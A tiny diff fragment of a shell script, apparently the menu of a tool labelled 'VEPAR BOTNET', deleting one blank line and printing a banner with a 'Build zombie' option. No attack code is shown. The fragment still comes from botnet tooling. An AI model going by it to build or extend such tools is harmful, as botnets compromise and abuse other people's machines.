@@ -69,7 +69,6 @@ loading() {
 
 sleep 2 &
 loading
-
 echo -e "\n\033[0;36m    VEPAR BOTNET v$(cat ../VERSION)"
 echo -e "├──────────────────────────────────────────────────"
 echo -e "\033[0;36m│  1. \033[0;35mBuild zombie"
